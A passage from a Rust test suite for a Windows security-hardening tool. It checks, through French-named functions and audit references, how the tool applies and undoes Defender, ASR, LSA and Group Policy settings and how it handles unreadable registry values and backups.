    inconnue.ace_inconnue = true;
    assert_eq!(mode_ecriture(Some(&inconnue), Some(&inconnue.clone())), ModeEcriture::EnPlace, "entrée non reconnue");
    // Sur disque : contenu remplacé, droits inchangés, aucun fichier voisin laissé
    let d = dossier_gpo_test("bloc");
    let f = d.join("Registry.pol");
    ecrire_d_un_bloc(&f, b"un").unwrap();
    let avant = lire_securite(&f).unwrap();
    ecrire_d_un_bloc(&f, b"deux").unwrap();
    assert_eq!(std::fs::read(&f).unwrap(), b"deux");
    let apres = lire_securite(&f).unwrap();
    assert_eq!((apres.aces, apres.protege), (avant.aces, avant.protege), "droits inchangés");
    assert_eq!(std::fs::read_dir(&d).unwrap().count(), 1, "aucun fichier voisin laissé");
    // S270-02 : fichiers voisins orphelins d'un arrêt brutal retirés à l'écriture suivante, motif exact seulement
    use crate::gpo::est_voisin_orphelin;
    assert!(est_voisin_orphelin("Registry.pol.d4t-1234.tmp", "Registry.pol"));
    for n in ["Registry.pol.d4t-.tmp", "Registry.pol.d4t-12a.tmp", "Registry.pol.d4t-1234.tmp.x", "audit.csv.d4t-1.tmp", "xRegistry.pol.d4t-1.tmp", "Registry.pol"] {
        assert!(!est_voisin_orphelin(n, "Registry.pol"), "{n}");
    }
    for n in ["Registry.pol.d4t-99999.tmp", "Registry.pol.d4t-x.tmp", "audit.csv.d4t-1.tmp"] {
        std::fs::write(d.join(n), b"x").unwrap();
    }
    ecrire_d_un_bloc(&f, b"trois").unwrap();
    assert!(!d.join("Registry.pol.d4t-99999.tmp").exists(), "orphelin retiré");
    assert!(d.join("Registry.pol.d4t-x.tmp").exists() && d.join("audit.csv.d4t-1.tmp").exists(), "autres fichiers jamais touchés");
    let _ = std::fs::remove_dir_all(&d);
}

#[test]
fn audit_a_2_2_sauvegarde_d_origine_verifiee() {
    // A-2-2 : copie de l'origine relue et comparée ; original illisible : refus et copie incomplète retirée ;
    // dossier présent avec un fichier manquant : dit, jamais refait
    use crate::baseline::sauvegarder_fichiers_gpo_dans;
    use std::os::windows::fs::OpenOptionsExt;
    let d = dossier_gpo_test("origine");
    let racine = d.join("GroupPolicy");
    let copie = d.join("gpo-origine");
    std::fs::create_dir_all(racine.join("Machine")).unwrap();
    std::fs::write(racine.join("gpt.ini"), b"[General]\r\nVersion=1\r\n").unwrap();
    std::fs::write(racine.join(r"Machine\Registry.pol"), pol_exemple().1).unwrap();
    // Original tenu par un autre programme : refus, aucune copie gardée
    {
        let _tenu = std::fs::OpenOptions::new().read(true).share_mode(0).open(racine.join(r"Machine\Registry.pol")).unwrap();
        assert!(sauvegarder_fichiers_gpo_dans(&racine, &copie).is_err());
    }
    assert!(!copie.exists(), "copie incomplète retirée, reprise la fois suivante");
    // Copie vérifiée ; audit.csv absent à l'origine : rien à copier
    assert_eq!(sauvegarder_fichiers_gpo_dans(&racine, &copie), Ok(String::new()));
    assert_eq!(std::fs::read(copie.join("Registry.pol")).unwrap(), pol_exemple().1);
    assert!(!copie.join("audit.csv").exists());
    // Déjà prise : jamais refaite, même si l'original a changé
    std::fs::write(racine.join("gpt.ini"), b"[General]\r\nVersion=2\r\n").unwrap();
    assert_eq!(sauvegarder_fichiers_gpo_dans(&racine, &copie), Ok(String::new()));
    assert_eq!(std::fs::read(copie.join("gpt.ini")).unwrap(), b"[General]\r\nVersion=1\r\n");
    // Copie qui manque alors que l'original existe : dit, pas refaite
    std::fs::remove_file(copie.join("gpt.ini")).unwrap();
    let note = sauvegarder_fichiers_gpo_dans(&racine, &copie).unwrap();
    assert!(note.contains("gpt.ini") && note.contains("incomplète"), "{note}");
    assert!(!copie.join("gpt.ini").exists(), "jamais refaite");
    let _ = std::fs::remove_dir_all(&d);
}

#[test]
fn audit_a_2_3_annulation_respecte_un_durcissement_tiers() {
    // Audit du 2026-11-23, A-2-3 : la valeur actuelle n'est remise (ou supprimée) que si elle est celle posée par
    // deR4Tizer ou déjà celle d'origine ; sinon elle est laissée, et le message le dit
    use crate::baseline::{a_remettre, message_laissees, Decision};
    assert_eq!(a_remettre("2", Some("0"), Some("1")), Decision::Laisser, "règle ASR passée en blocage par un tiers");
    assert_eq!(a_remettre("1", None, Some("2")), Decision::Laisser, "RunAsPPL posé à 2 par un tiers");
    assert_eq!(a_remettre("1", Some("0"), Some("1")), Decision::RemettreOrigine, "actuelle = posée : origine remise");
    assert_eq!(a_remettre("1", Some("0"), Some(" 1 ")), Decision::RemettreOrigine);
    assert_eq!(a_remettre("1", Some("0"), Some("0")), Decision::RemettreOrigine, "déjà l'origine : remise sans effet");
    assert_eq!(a_remettre("1", None, Some("1")), Decision::Supprimer, "absente à l'origine et actuelle = posée : suppression");
    assert_eq!(a_remettre("1", None, None), Decision::Supprimer, "déjà absente");
    assert_eq!(a_remettre("1", Some("0"), None), Decision::Laisser, "retirée par un tiers : laissée");
    // Prérelecture de #270 : la valeur d'une règle plus stricte encore appliquée (ou annulée en même temps) n'est pas
    // « un tiers » ; une valeur durcie ou effacée par un tiers l'est
    use crate::baseline::decision_annulation;
    let posees = |l: &[&str]| l.iter().map(|s| s.to_string()).collect::<Vec<_>>();
    assert_eq!(decision_annulation(&posees(&["2", "1"]), Some("0"), Some("1")), Decision::RemettreOrigine, "accès contrôlé : blocage encore appliqué");
    assert_eq!(decision_annulation(&posees(&["2"]), Some("0"), Some("1")), Decision::Laisser, "durcie par un tiers");
    assert_eq!(decision_annulation(&posees(&["2"]), Some("0"), None), Decision::Laisser, "effacée par un tiers");
    assert_eq!(decision_annulation(&posees(&["2"]), None, Some("2")), Decision::Supprimer);
    assert_eq!(message_laissees(&[]), "");
    let m = message_laissees(&(0..7).map(|i| format!("r{i}")).collect::<Vec<_>>());
    assert!(m.contains("r4") && !m.contains("r5") && m.contains("et 2 autre(s)"), "{m}");
    // Câblage : décision prise avant toute écriture du registre, entrée retirée avec sa valeur posée, entrées gardées
    // de Registry.pol jamais écrasées après gpupdate
    let src = include_str!("baseline.rs");
    let d = src.find("pub fn annuler(").unwrap();
    let corps = &src[d..d + src[d..].find("\npub fn ").unwrap()];
    let decision = corps.find("== Decision::Laisser").expect("décision dans annuler");
    assert!(decision < corps.find("k.set_value(nom, &d)").unwrap(), "décision avant l'écriture");
    assert!(corps.contains("retraits.push(entree(cle, nom, catalogue));"), "retrait avec la valeur posée");
    assert!(!corps.contains("retraits.push(EntreePol::dword(cle, nom, 0));"));
    assert!(corps.contains("valeurs_a_remettre.retain(|(c, nm, _, _, _)| !gardees_pol.borrow()"));
    // D1 (prérelecture de #270) : valeur d'un tiers (durcie ou effacée directement dans le registre) ; l'entrée posée
    // de Registry.pol est retirée (sinon gpupdate remettrait la valeur posée), la valeur lue avant l'annulation est
    // rétablie après gpupdate, et un échec garde la règle dans la sauvegarde
    let laisser = &corps[decision..];
    let fin_branche = laisser.find("continue;").unwrap();
    assert!(laisser[..fin_branche].contains("retraits.push(entree(cle, nom, catalogue));"), "entrée posée retirée aussi pour une valeur d'un tiers");
    assert!(laisser[..fin_branche].contains("tiers.push((cle.to_string(), nom.to_string(), actuelle, texte, r.id));"), "valeur du tiers gardée pour être rétablie");
    let gp = corps.find("etapes.push((\"mise à jour des stratégies (gpupdate)\"").unwrap();
    assert!(corps.find("if retablir_valeur(c, nm, v.as_deref(), *texte) {").expect("rétablie") > gp, "rétablie après gpupdate");
    assert!(corps.contains("tiers_echecs.push(("), "échec de rétablissement retenu");
    assert!(corps.contains(".chain(tiers_echecs.iter().map(|x| x.1)).collect();"), "règle gardée dans la sauvegarde");
    assert!(corps.contains("valeurs_posees(&appliquees, catalogue, cle, nom)"), "valeurs des règles appliquées : pas « un tiers »");
    // S270-03 (réaudit de #270) : seul « introuvable » vaut absente ; clé illisible, lecture en échec ou type non lu
    // (QWORD, MULTI_SZ) : illisible, jamais confondu avec une valeur effacée par un tiers
    use crate::baseline::{classer_lecture, message_illisibles, LectureRegistre::{Absente, Illisible, Valeur}};
    use std::io::ErrorKind::{InvalidData, NotFound, PermissionDenied};
    assert_eq!(classer_lecture(Err(NotFound), Err(NotFound), Err(NotFound)), Absente, "clé introuvable");
    assert_eq!(classer_lecture(Ok(()), Err(NotFound), Err(NotFound)), Absente, "valeur introuvable");
    assert!(matches!(classer_lecture(Err(PermissionDenied), Err(PermissionDenied), Err(PermissionDenied)), Illisible(_)), "clé illisible");
    assert!(matches!(classer_lecture(Ok(()), Err(PermissionDenied), Err(PermissionDenied)), Illisible(_)), "lecture en échec");
    assert!(matches!(classer_lecture(Ok(()), Err(InvalidData), Err(InvalidData)), Illisible(_)), "type non lu (QWORD)");
    assert_eq!(classer_lecture(Ok(()), Ok(1), Err(InvalidData)), Valeur("1".into()));
    assert_eq!(classer_lecture(Ok(()), Err(InvalidData), Ok("2".into())), Valeur("2".into()), "texte (règle ASR)");
    assert!(message_illisibles(&["r : c\\n".into()]).contains("illisible"));
    // Câblage : la branche illisible passe avant la décision, ne retire rien, garde la règle et le dit
    let lecture = corps.find("let actuelle = match lire_registre_etat(cle, nom) {").expect("lecture qui distingue introuvable");
    let branche = &corps[lecture..];
    let illisible = &branche[branche.find("LectureRegistre::Illisible(e) => {").unwrap()..];
    let fin = illisible.find("continue;").unwrap();
    assert!(illisible[..fin].contains("remise = false;") && illisible[..fin].contains("illisibles.push("), "règle gardée et dite");
    assert!(!illisible[..fin].contains("retraits.push") && !illisible[..fin].contains("tiers.push"), "ni retrait ni rétablissement");
    assert!(lecture < decision, "lecture classée avant la décision");
    assert!(!corps.contains("let actuelle = lire_registre(cle, nom);"), "plus de lecture qui confond absente et illisible");
    assert!(corps.contains("message_illisibles(&illisibles)"));
    assert!(src.contains("efface && lire_registre_etat(cle, nom) == LectureRegistre::Absente"), "effacement vérifié sans confondre");
}

#[test]
fn audit_a_2_2_cablage_lecture_avant_ecriture() {
    // A-2-2 : appliquer et annuler lisent la GPO en échec fermé avant toute écriture ; plus aucune lecture qui vaut
    // « vide » sur erreur, plus de copie d'origine ignorée
    let g = include_str!("gpo.rs");
    assert!(!g.contains("else { return Vec::new() }"), "lecture en échec = vide");
    assert!(!g.contains("read_to_string(&f).unwrap_or_default()"));
    assert!(!g.contains(concat!("fs::", "write(fichier_")), "écriture directe sans fichier voisin");
    let b = include_str!("baseline.rs");
    assert!(!b.contains(concat!("let _ = std::fs::", "copy")), "copie d'origine non vérifiée");
    let d = b.find("pub fn appliquer(").unwrap();
    let corps = &b[d..d + b[d..].find("\npub fn ").unwrap()];
    let lecture = corps.find("lire_gpo_avant_ecriture()?").expect("lecture vérifiée dans appliquer");
    assert!(lecture < corps.find("sauvegarder_fichiers_gpo()").unwrap() && lecture < corps.find("let mut etapes").unwrap());
    let d = b.find("pub fn annuler(").unwrap();
    let corps = &b[d..d + b[d..].find("\npub fn ").unwrap()];
    assert!(corps.find("lire_gpo_avant_ecriture()?").expect("lecture vérifiée dans annuler") < corps.find("set_value").unwrap(), "avant toute écriture du registre");
}

#[test]
fn audit_a_2_1_outils_systeme_par_chemin_complet() {
    // Audit du 2026-11-23, A-2-1 (gpo.rs et baseline.rs) : plus aucun programme lancé par son nom nu, qui serait
    // d'abord cherché dans le dossier de l'exécutable puis dans le PATH
    let appel = concat!("Command::new(", "\"");
    for (nom, source) in [("gpo", include_str!("gpo.rs")), ("baseline", include_str!("baseline.rs"))] {
        assert!(!source.contains(appel), "{nom}.rs lance un programme par son nom nu");
    }
    let p = crate::gpo::outil_systeme("wevtutil.exe");
    assert!(std::path::Path::new(&p).is_absolute() && p.to_lowercase().ends_with(r"\system32\wevtutil.exe"), "{p}");
    for o in ["wevtutil.exe", "auditpol.exe", "gpupdate.exe"] {
        assert!(std::path::Path::new(&crate::gpo::outil_systeme(o)).is_file(), "{o} introuvable dans System32");
    }
}

#[test]
fn baseline_b2_gestion_illisible_vaut_lecture_seule() {
    // Relecture de la baseline du 2026-11-20, B2 : seule une réponse complète vaut « non géré »
    use crate::baseline::{analyser_gestion, message_gestion, Gestion};
    assert_eq!(analyser_gestion(Some("False|0")), Gestion::NonGere);
    assert_eq!(analyser_gestion(Some("  false|0\r\n")), Gestion::NonGere);
    assert!(matches!(analyser_gestion(Some("True|0")), Gestion::Gere(m) if m.contains("domaine Active Directory")));
    assert!(matches!(analyser_gestion(Some("False|2")), Gestion::Gere(m) if m.contains("Intune")));
    assert!(matches!(analyser_gestion(Some("True|1")), Gestion::Gere(m) if m.contains("domaine Active Directory et Intune")));
    // lancement en échec, sortie vide ou mal formée : illisible, jamais « non géré »
    for s in [None, Some(""), Some("   "), Some("False"), Some("|0"), Some("False|"), Some("Faux|0"), Some("False|-1"), Some("False|abc"), Some("Erreur PowerShell")] {
        assert_eq!(analyser_gestion(s), Gestion::Illisible, "{s:?}");
    }
    assert!(message_gestion(&Gestion::NonGere).is_none());
    assert!(message_gestion(&Gestion::Illisible).unwrap().contains("lecture seule"));
    // mini-fuzz : aucune panique, et une sortie abîmée n'est jamais lue « non géré » sauf si elle est exactement bien formée
    crate::tests::torturer_texte("False|0", &mut |t| {
        let g = analyser_gestion(Some(t));
        if g == Gestion::NonGere {
            let (d, m) = t.trim().split_once('|').unwrap();
            assert!(d.trim().eq_ignore_ascii_case("false") && m.trim().parse::<u32>() == Ok(0), "{t:?}");
        }
    });
    // plus de cache à vie : appliquer relit la gestion à chaque fois
    let src = include_str!("baseline.rs");
    assert!(!src.contains("OnceLock<Option<String>>"), "plus de résultat figé pour la vie du service");
    let debut = src.find("pub fn appliquer(").unwrap();
    assert!(src[debut..debut + 200].contains("gestion_fraiche()"), "appliquer relit la gestion");
}

#[test]
fn baseline_s215_01_sauvegarde_illisible_jamais_ecrasee() {
    // Audit de #215, S215-01 : une sauvegarde présente mais illisible fait refuser l'opération avant toute écriture,
    // au lieu d'être lue vide puis écrasée
    use crate::baseline::decider_sauvegarde;
    assert_eq!(decider_sauvegarde::<Vec<u8>>(false, None), Ok(Vec::new()), "absente : vide");
    assert_eq!(decider_sauvegarde(true, Some(vec![1u8])), Ok(vec![1u8]), "présente et lisible");
    let e = decider_sauvegarde::<Vec<u8>>(true, None).unwrap_err();
    assert!(e.contains("illisible") && e.contains("rien n'a été modifié"), "{e}");
    // câblage : appliquer et annuler passent par lire_sauvegarde, plus jamais par unwrap_or_default
    let src = include_str!("baseline.rs");
    for f in ["pub fn appliquer(", "pub fn annuler("] {
        let d = src.find(f).unwrap();
        let corps = &src[d..d + 400];
        assert!(corps.contains("lire_sauvegarde()?"), "{f} lit la sauvegarde par lire_sauvegarde");
    }
    assert!(!src.contains("let mut sauvegarde: Sauvegarde = commun::lire(\"baseline-sauvegarde.json\").unwrap_or_default();"));
    // annuler sans règle appliquée : rien n'est réécrit
    let d = src.find("pub fn annuler(").unwrap();
    assert!(src[d..d + 400].contains("rien à annuler"));
}

#[test]
fn baseline_s215_02_a_04_cablage() {
    let src = include_str!("baseline.rs");
    // S215-03 : une valeur d'origine illisible fait refuser l'application, jamais « désactivé » par défaut
    assert!(!src.contains("audit_effectif(guid).unwrap_or(0)"));
    assert!(!src.contains("journal_actif(canal).unwrap_or(false)"));
    // S215-04 : PowerShell borné à 60 s, tué au-delà
    let d = src.find("fn lire_gestion()").unwrap();
    let corps = &src[d..d + 2500];
    assert!(corps.contains("try_wait()") && corps.contains("enfant.kill()") && corps.contains("from_secs(60)"));
    // S215-02 : le moniteur prend le drapeau de la baseline (et le rend sur chaque chemin)
    let m = include_str!("moniteur.rs");
    assert!(m.contains("p.baseline_occupee.compare_exchange(false, true"), "drapeau pris, pas seulement lu");
    assert!(!m.contains("if !p.baseline_occupee.load(Ordering::Relaxed)"));
    let d = m.find("p.baseline_occupee.compare_exchange(false, true").unwrap();
    let bloc = &m[d..d + 2500];
    assert_eq!(bloc.matches("p.baseline_occupee.store(false, Ordering::Release);").count(), 2, "rendu avant continue et en fin de bloc");
}

#[test]
fn baseline_annuler_ne_masque_aucun_echec_de_restauration() {
    // Prérelecture de #215, D2 : une valeur d'origine non remise (registre, auditpol, journal) garde la règle dans la
    // sauvegarde et le message le dit ; plus d'affirmation « valeurs d'origine remises » sans contrôle
    let src = include_str!("baseline.rs");
    let d = src.find("pub fn annuler(").unwrap();
    let f = src[d..].find("\npub fn ").map(|i| d + i).unwrap();
    let corps = &src[d..f];
    assert!(!corps.contains("let _ = k.set_value"), "écriture de la valeur d'origine contrôlée");
    assert!(!corps.contains("let _ = k.delete_value"), "suppression contrôlée");
    assert!(corps.contains(".map(|o| o.status.success())"), "code de sortie d'auditpol contrôlé");
    assert!(corps.contains("remise &= evenements::activer_journal(canal, false)"), "retour de la coupure du journal contrôlé");
    assert!(corps.contains("sauvegarde.regles.insert(r.id.to_string(), origine)"), "règle non remise gardée dans la sauvegarde");
    assert!(!corps.contains("valeurs d'origine remises dans le registre"), "plus d'affirmation sans contrôle");
    // D1 : protection du dossier en échec, ni application ni annulation
    let d = src.find("fn lire_sauvegarde()").unwrap();
    assert!(src[d..d + 600].contains("commun::echec_protection().is_some()"));
}

#[test]
fn baseline_b3_aucune_cle_en_conflit_sauf_plus_stricte_declaree() {
    // Relecture de la baseline du 2026-11-20, B3 (a) : deux règles qui posent la même clé et le même nom avec des
    // valeurs différentes ne sont admises que si l'une est déclarée plus stricte que l'autre (PLUS_STRICTES)
    use crate::baseline::{Mecanisme::Registre, Valeur::Dword, PLUS_STRICTES, REGLES};
    let mut poses: Vec<(&str, &str, &str, String)> = Vec::new();
    for r in REGLES {
        for m in r.mecanismes {
            if let Registre { cle, nom, valeur } = m {
                poses.push((r.id, cle, nom, match valeur { Dword(n) => n.to_string(), crate::baseline::Valeur::Texte(t) => t.to_string() }));
            }
        }
    }
    let mut conflits = Vec::new();
    for (i, a) in poses.iter().enumerate() {
        for b in &poses[i + 1..] {
            if a.1.eq_ignore_ascii_case(b.1) && a.2.eq_ignore_ascii_case(b.2) && a.3 != b.3 {
                let declare = |x: &str, y: &str| PLUS_STRICTES.iter().any(|(n, v, acc)| n.eq_ignore_ascii_case(a.2) && v.to_string() == x && acc.iter().any(|w| w.to_string() == y));
                if !declare(&a.3, &b.3) && !declare(&b.3, &a.3) {
                    conflits.push(format!("{} et {} : {} / {}", a.0, b.0, a.1, a.2));
                }
            }
        }
    }
    assert!(conflits.is_empty(), "clés en conflit non déclarées : {conflits:?}");
    // la seule paire connue est bien déclarée
    assert!(PLUS_STRICTES.iter().any(|(n, v, acc)| *n == "EnableControlledFolderAccess" && *v == 2 && acc.contains(&1)));
}

#[test]
fn baseline_b3_recommande_apres_renforce_ne_retrograde_pas() {
    // B3 (b) et (c) : la valeur d'audit (2) n'est pas écrite quand le blocage (1) est appliqué ou appliqué en même
    // temps ; et le blocage satisfait la règle d'audit, donc pas de « non conforme » ni de BAS-001 à tort
    use crate::baseline::{ecriture_retenue, valeur_satisfaite, Valeur::Dword};
    let cle = r"SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\Controlled Folder Access";
    let nom = "EnableControlledFolderAccess";
    let blocage = Dword(1);
    let audit = Dword(2);
    assert!(!ecriture_retenue(cle, nom, &audit, &[(cle, nom, &blocage)]), "audit après blocage : pas d'écriture");
    assert!(ecriture_retenue(cle, nom, &blocage, &[(cle, nom, &audit)]), "blocage après audit : écrit");
    assert!(ecriture_retenue(cle, nom, &audit, &[]), "audit seul : écrit");
    assert!(ecriture_retenue(cle, nom, &audit, &[(cle, nom, &audit)]), "même valeur : écrite");
    assert!(valeur_satisfaite(nom, &audit, Some("1")), "blocage satisfait l'audit");
    assert!(valeur_satisfaite(nom, &audit, Some("2")));
    assert!(!valeur_satisfaite(nom, &audit, Some("0")), "désactivé ne satisfait pas l'audit");
    assert!(!valeur_satisfaite(nom, &blocage, Some("2")), "l'audit ne satisfait pas le blocage");
    assert!(!valeur_satisfaite(nom, &audit, None));
    assert!(!valeur_satisfaite("AutreNom", &audit, Some("1")), "relation limitée à la valeur déclarée");
    // câblage : appliquer filtre ses écritures, verifier_mecanisme passe par valeur_satisfaite
    let src = include_str!("baseline.rs");
    assert!(src.contains("if a_poser && ecriture_retenue(cle, nom, valeur, &autres) && !deja_plus_stricte(nom, valeur, lire_registre(cle, nom).as_deref()) {"));
    assert!(src.contains("(Some(valeur_satisfaite(nom, valeur, actuel.as_deref()))"));
}

#[test]
fn baseline_s215_07_a_09_cablage() {
    let src = include_str!("baseline.rs");
    // S215-07 : une erreur d'accès autre que « introuvable » vaut « présente »
    let d = src.find("fn lire_sauvegarde()").unwrap();
    let corps = &src[d..d + 1200];
    assert!(corps.contains("symlink_metadata") && corps.contains("ErrorKind::NotFound"));
    assert!(!corps.contains(".exists()"));
    // S215-08 : PowerShell sans entrée standard héritée
    let d = src.find("fn lire_gestion()").unwrap();
    assert!(src[d..d + 2500].contains(".stdin(std::process::Stdio::null())"));
    // S215-09 : « premier » consommé dans le bloc de la baseline, pas après
    let m = include_str!("moniteur.rs");
    let d = m.find("p.baseline_occupee.compare_exchange(false, true").unwrap();
    let bloc = &m[d..d + 3000];
    let fin = bloc.find("p.baseline_occupee.store(false, Ordering::Release);\r\n                        // Consommé")
        .or_else(|| bloc.find("p.baseline_occupee.store(false, Ordering::Release);\n                        // Consommé"));
    assert!(fin.is_some(), "premier remis à faux dans le bloc, après avoir rendu le drapeau");
}

#[test]
fn baseline_s216_01_a_03_cablage() {
    let src = include_str!("baseline.rs");
    let d = src.find("pub fn appliquer(").unwrap();
    let corps = &src[d..d + 4000];
    // S216-01 : une règle déjà appliquée ne retient une écriture que si sa valeur est vraiment en place
    assert!(corps.contains("(sauvegarde.regles.contains_key(r.id) && valeur_satisfaite(nom, valeur, lire_registre(cle, nom).as_deref()))"),
        "retenue seulement si la valeur plus stricte est en place");
    assert!(!corps.contains(".filter(|r| sauvegarde.regles.contains_key(r.id) || regles.iter().any(|x| x.id == r.id))"),
        "plus de retenue sur le seul marquage « appliquée »");
    // S216-02 : origine reprise de la règle déjà appliquée sur la même clé
    assert!(corps.contains("origines_connues.get(&cle_origine.to_ascii_lowercase())"));
    // S216-03 : l'application automatique ne passe plus par-dessus une opération demandée par l'interface
    let m = include_str!("moniteur.rs");
    assert!(m.contains("!p.baseline_commande_recue.load(Ordering::Acquire)"));
    assert!(m.contains("if matches!(c.valeur.as_deref(), Some(\"appliquer\") | Some(\"annuler\")) {"), "une réévaluation ne compte pas");
}

#[test]
fn baseline_b4_etat_effectif_de_defender() {
    // Relecture de la baseline du 2026-11-20, B4 : une règle Defender posée dans le registre n'est conforme que si
    // Defender l'applique ; Defender passif ou réglage ignoré = « sans effet » ; état illisible = jamais conforme
    use crate::baseline::{effet_defender, etat_regle, Effet, Mecanisme::Registre, Valeur::{Dword, Texte}};
    use crate::defender::{prefs_depuis, PrefsDefender};
    use std::collections::HashMap;
    use wmi::Variant;
    let asr_cle = r"SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\ASR\Rules";
    let guid = "BE9BA2D9-53EA-4CDC-84E5-9B1EEEE46550";
    // lecture de MSFT_MpPreference
    let mut o: HashMap<String, Variant> = HashMap::new();
    o.insert("PUAProtection".into(), Variant::UI1(1));
    o.insert("DisableRemovableDriveScanning".into(), Variant::Bool(false));
    o.insert("EnableControlledFolderAccess".into(), Variant::UI1(1));
    o.insert("AttackSurfaceReductionRules_Ids".into(), Variant::Array(vec![Variant::String(guid.to_lowercase())]));
    o.insert("AttackSurfaceReductionRules_Actions".into(), Variant::Array(vec![Variant::UI1(1)]));
    let p: PrefsDefender = prefs_depuis(&o);
    assert_eq!(p.valeurs.get("PUAProtection").map(String::as_str), Some("1"));
    assert_eq!(p.valeurs.get("DisableRemovableDriveScanning").map(String::as_str), Some("0"));
    assert_eq!(p.asr.get(guid).map(String::as_str), Some("1"), "GUID mis en majuscules");
    let pua = Registre { cle: r"SOFTWARE\Policies\Microsoft\Windows Defender", nom: "PUAProtection", valeur: Dword(1) };
    let usb = Registre { cle: r"SOFTWARE\Policies\Microsoft\Windows Defender\Scan", nom: "DisableRemovableDriveScanning", valeur: Dword(0) };
    let cfa_audit = Registre { cle: r"SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\Controlled Folder Access", nom: "EnableControlledFolderAccess", valeur: Dword(2) };
    let asr_ok = Registre { cle: asr_cle, nom: guid, valeur: Texte("1") };
    let asr_audit = Registre { cle: asr_cle, nom: guid, valeur: Texte("2") };
    let asr_absente = Registre { cle: asr_cle, nom: "D4F940AB-401B-4EFC-AADC-AD5F3C50688A", valeur: Texte("1") };
    let hors = Registre { cle: r"SOFTWARE\Policies\Microsoft\Windows NT\DNSClient", nom: "EnableMulticast", valeur: Dword(0) };
    let interrupteur = Registre { cle: r"SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\ASR", nom: "ExploitGuard_ASR_Rules", valeur: Dword(1) };
    // Defender actif
    assert_eq!(effet_defender(&pua, Some(&p), "Normal"), Effet::Conforme);
    assert_eq!(effet_defender(&usb, Some(&p), "Normal"), Effet::Conforme, "booléen faux = 0");
    assert_eq!(effet_defender(&cfa_audit, Some(&p), "Normal"), Effet::Conforme, "blocage effectif satisfait l'audit");
    assert_eq!(effet_defender(&asr_ok, Some(&p), "Normal"), Effet::Conforme);
    assert!(matches!(effet_defender(&asr_audit, Some(&p), "Normal"), Effet::SansEffet(r) if r.contains("valeur 1")), "action différente");
    assert!(matches!(effet_defender(&asr_absente, Some(&p), "Normal"), Effet::SansEffet(r) if r.contains("absente")));
    assert_eq!(effet_defender(&hors, Some(&p), "Normal"), Effet::NonConcerne);
    assert_eq!(effet_defender(&interrupteur, Some(&p), "Normal"), Effet::NonConcerne);
    // Defender passif, ou pas l'antivirus actif
    for mode in ["Passive Mode", "SxS Passive Mode", "EDR Block Mode", "Not running"] {
        assert!(matches!(effet_defender(&pua, Some(&p), mode), Effet::SansEffet(r) if r.contains("pas l'antivirus actif")), "{mode}");
    }
    // illisible : jamais conforme
    assert_eq!(effet_defender(&pua, None, "Normal"), Effet::Illisible);
    assert_eq!(effet_defender(&pua, Some(&p), ""), Effet::Illisible);
    assert_eq!(effet_defender(&Registre { cle: r"x", nom: "MpCloudBlockLevel", valeur: Dword(2) }, Some(&p), "Normal"), Effet::Illisible, "propriété absente de la lecture");
    // état de la règle
    assert_eq!(etat_regle("conforme", &[Effet::Conforme, Effet::NonConcerne]).0, "conforme");
    let (e, note) = etat_regle("conforme", &[Effet::SansEffet("Defender passif".into())]);
    assert_eq!(e, "sans effet");
    assert!(note.contains("Defender passif"));
    assert_eq!(etat_regle("conforme", &[Effet::Illisible]).0, "inconnu", "illisible n'est jamais conforme");
    assert_eq!(etat_regle("non conforme", &[Effet::Conforme]).0, "non conforme", "le registre reste la première condition");
    // câblage : evaluer lit l'état effectif et passe par etat_regle ; le score ne compte que « conforme »
    let src = include_str!("baseline.rs");
    assert!(src.contains("let (etat, mut note) = etat_regle(etat_registre, &effets);"));
    assert!(src.contains("let (mode, prefs) = defender_borne();"));
    // S217-02 : lecture de Defender bornée, jamais relancée tant qu'une lecture est bloquée
    assert!(src.contains("rx.recv_timeout(std::time::Duration::from_secs(30)).unwrap_or_default()"));
    assert!(src.contains("if EN_COURS.swap(true, Ordering::AcqRel) {"));
}

#[test]
fn baseline_t2_table_des_regles() {
    // Relecture de la baseline du 2026-11-20, T2 : identifiants uniques ; GUID ASR et d'audit bien formés, sans doublon
    use crate::baseline::{Mecanisme::{Audit, Registre}, REGLES};
    let mut ids = std::collections::HashSet::new();
    for r in REGLES {
        assert!(ids.insert(r.id), "identifiant en double : {}", r.id);
    }
    let guid_ok = |g: &str| {
        let g = g.trim_matches(|c| c == '{' || c == '}');
        let parties: Vec<&str> = g.split('-').collect();
        parties.len() == 5 && [8, 4, 4, 4, 12].iter().zip(&parties).all(|(n, p)| p.len() == *n && p.chars().all(|c| c.is_ascii_hexdigit()))
    };
    let (mut asr, mut audit) = (std::collections::HashSet::new(), std::collections::HashSet::new());
    for r in REGLES {
        for m in r.mecanismes {
            match m {
                Registre { cle, nom, .. } if cle.ends_with(r"\ASR\Rules") => {
                    assert!(guid_ok(nom), "GUID ASR mal formé : {nom} ({})", r.id);
                    assert!(asr.insert(nom.to_uppercase()), "GUID ASR en double : {nom}");
                }
                Audit { guid, .. } => {
                    assert!(guid_ok(guid), "GUID d'audit mal formé : {guid} ({})", r.id);
                    assert!(audit.insert(guid.to_uppercase()), "GUID d'audit en double : {guid}");
                }
                _ => {}
            }
        }
    }
    assert_eq!(asr.len(), 15);
    assert_eq!(audit.len(), 14);
}

#[test]
fn baseline_b5_lsa_sans_verrou_et_taille_de_journal() {
    // Relecture de la baseline du 2026-11-20, B5, d'après l'essai en VM du même jour (génération 2, Secure Boot) :
    // RunAsPPL = 2 (sans verrou UEFI), refusée avant Windows 11 22H2 ; 1 satisfait la règle sans être jamais posée
    use crate::baseline::{lsa_applicable, taille_effective, valeur_satisfaite, Mecanisme::Registre, Valeur::Dword, REGLES};
    let lsa = REGLES.iter().find(|r| r.id == "systeme.lsa").unwrap();
    assert!(lsa.mecanismes.iter().any(|m| matches!(m, Registre { nom: "RunAsPPL", valeur: Dword(2), .. })), "valeur 2 posée");
    assert!(!lsa.mecanismes.iter().any(|m| matches!(m, Registre { nom: "RunAsPPL", valeur: Dword(1), .. })), "jamais le verrou UEFI");
    assert!(lsa.compat.contains("22H2"), "compatibilité dite");
    assert!(valeur_satisfaite("RunAsPPL", &Dword(2), Some("1")), "protection avec verrou : conforme");
    assert!(!valeur_satisfaite("RunAsPPL", &Dword(2), Some("0")));
    assert!(lsa_applicable(Some(22621)) && lsa_applicable(Some(26300)));
    assert!(!lsa_applicable(Some(22000)) && !lsa_applicable(Some(19045)), "Windows 10 et 11 21H2 : refusée");
    assert!(!lsa_applicable(None), "build illisible : refusée");
